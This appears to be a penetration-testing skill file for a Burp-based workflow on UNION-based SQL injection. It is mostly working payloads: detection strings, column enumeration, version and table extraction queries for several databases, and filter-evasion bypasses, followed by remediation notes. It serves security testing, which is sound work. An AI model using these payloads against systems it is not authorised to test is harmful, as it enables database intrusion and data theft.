---
name: SQL Injection UNION-based
version: 1.0
author: community
description: Detect SQL injection using UNION technique
tags: [sqli, injection, owasp-a03, database]
requires_selection: true
---

# SQL Injection UNION-based

## Objective

Detect and exploit SQL injections allowing data extraction via the UNION SELECT technique.

## Prerequisites

- The vulnerable SQL query must return visible data
- The number of columns must match

## Test steps

### 1. Identify injection points

Suspicious parameters:
- Numeric IDs: `?id=1`, `?user_id=123`
- Filters: `?category=electronics`, `?sort=name`
- Search: `?q=keyword`, `?search=term`

### 2. Test for vulnerability

**Detection payloads:**
```sql
' OR '1'='1
" OR "1"="1
1 OR 1=1
1' OR '1'='1' --
1" OR "1"="1" --
```

**Trigger an error:**
```sql
'
"
1'
1"
1 AND 1=CONVERT(int,@@version)--
```

### 3. Determine the number of columns

**ORDER BY method:**
```sql
1 ORDER BY 1--
1 ORDER BY 2--
1 ORDER BY 3--
... (until error)
```

**UNION NULL method:**
```sql
1 UNION SELECT NULL--
1 UNION SELECT NULL,NULL--
1 UNION SELECT NULL,NULL,NULL--
```

### 4. Identify displayed columns

```sql
1 UNION SELECT 'a',NULL,NULL--
1 UNION SELECT NULL,'a',NULL--
1 UNION SELECT NULL,NULL,'a'--
```

### 5. Extract information

**Database version:**
```sql
-- MySQL
UNION SELECT @@version,NULL,NULL--

-- PostgreSQL
UNION SELECT version(),NULL,NULL--

-- MSSQL
UNION SELECT @@version,NULL,NULL--

-- Oracle
UNION SELECT banner FROM v$version WHERE ROWNUM=1--
```

**List tables:**
```sql
-- MySQL
UNION SELECT table_name,NULL FROM information_schema.tables--

-- PostgreSQL
UNION SELECT table_name,NULL FROM information_schema.tables--
```

### 6. Document the finding

If vulnerable:
```
burp_create_finding(
  title: "SQL Injection (UNION-based) on [endpoint]",
  type: "VULNERABILITY",
  severity: "HIGH",
  confidence: "CERTAIN",
  category: "SQLi",
  description: "SQL injection allowing data extraction...",
  remediation: "Use prepared statements (parameterized queries)...",
  references: ["CWE-89", "https://owasp.org/www-community/attacks/SQL_Injection"]
)
```

## Common bypasses

**Keyword filtering:**
```sql
uNiOn SeLeCt  -- Mixed case
UN/**/ION SEL/**/ECT  -- Comments
UNION%0ASELECT  -- Newline
```

**Quote filtering:**
```sql
1 OR 1=1--  -- No quotes for numeric
CHAR(39)  -- CHAR function
```

**Space filtering:**
```sql
UNION/**/SELECT
UNION%09SELECT  -- Tab
UNION%0ASELECT  -- Newline
```

## Vulnerability indicators

- SQL error visible in response
- Behavior change with `'` or `"`
- Delay with `SLEEP()` or `WAITFOR DELAY`
- Different data with UNION payloads

## Protection indicators

- Prepared statements (parameterized)
- Well-configured ORM
- WAF blocking payloads
- Strict input validation
